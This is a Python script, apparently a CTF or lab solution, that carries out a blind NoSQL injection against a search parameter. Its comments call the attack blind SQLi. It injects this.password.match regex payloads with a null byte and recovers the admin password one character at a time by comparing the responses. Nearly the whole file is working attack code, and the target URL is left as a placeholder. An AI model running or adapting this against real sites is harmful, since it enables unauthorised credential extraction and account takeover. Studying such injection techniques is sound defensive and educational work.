import requests
import urllib3
import string
import urllib
import time
urllib3.disable_warnings()

username='admin'
password=''
u='http://putyourdomainhere.com'



#working blind sqli to build off of:
# under correct condiition injection this.password.match(/.*/)%00 (null byte) will have a
# DIFFERENT response than if you have a false. Change /.*/ to like /xxxxxx/ and if that 
# vs .* are different you have a true/false situation, aka a blind sqli
# URL: http://putyourdomainhere/?search=admin%27%20%26%26%20this.password.match(/.*/)%00

print("Starting blind sqli...")

chars = set('0123456789abcdefghijklmnopqrstuvwxyz-')

while True:
  for c in string.printable:
    if c in chars:      payload='?search=%s%%27%%20%%26%%26%%20this.password.match(/^%s.*/)%%00' % (username, password + c)
      r = requests.get(u + payload)
#      uncomment these if you want to debug      
#      print("URL plus payload is:", r.url)
#      time.sleep(1)
      if 'search=admin' in r.text: # the raw response has to have this to be the "true" in your blind sqli
        print("Found one more char : %s" % (password+c)) # so lets build out the password one char at a time
        password += c